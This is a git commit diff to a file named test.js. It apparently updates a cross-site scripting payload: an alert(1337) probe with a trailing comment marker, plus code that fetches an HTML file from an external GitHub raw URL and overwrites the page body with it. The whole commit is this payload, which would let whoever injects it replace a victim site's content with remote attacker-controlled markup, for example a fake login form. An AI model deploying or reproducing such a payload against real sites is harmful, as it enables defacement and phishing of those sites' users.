19875468425611761fe5c46e0d6c6eb0d11db10c
achraf4test <112291751+achraf4test@users.noreply.github.com>
2023-05-05 16:06:09 +0100

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,4 @@
-alert(666);//
+alert(1337);//
+fetch("https://raw.githubusercontent.com/achraf4test/onemoretest/main/test.html").then(res=>res.text()).then(res => {
+    document.body.innerHTML = res;
+})
